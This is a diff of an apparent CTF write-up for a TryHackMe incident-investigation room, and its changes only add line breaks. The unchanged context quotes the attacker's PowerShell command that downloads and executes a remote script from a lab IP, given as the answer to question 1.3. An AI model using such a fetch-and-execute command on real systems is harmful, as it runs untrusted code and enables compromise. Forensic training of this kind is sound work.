@@ -40,6 +40,7 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 <img width="1359" height="475" alt="image" src="https://github.com/user-attachments/assets/2eeffd47-5e0d-4aa1-a5ac-a6dd33940aed" />
 
 <br>
+<br>
 
 <p>1.3. What command initiated the malicious script download?<br>
 <code>IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1')</code>
@@ -51,16 +52,19 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/eventhor
 <img width="1358" height="571" alt="image" src="https://github.com/user-attachments/assets/5657b241-81bf-4605-93e5-dbf7d15c7c4d" />
 
 <br>
+<br>
 
 <p>1.4. What is the initial AES key that is used for decrypting the C2 traffic?<br>
 <code>_________</code></p>
 
+<br>
 <br>
 
 
 <p>1.5. What is the Administrator NTLM hash that the attacker found?<br>
 <code>__________</code></p>
 
+<br>
 <br>
 
 <p>1.6. What is the flag?<br>
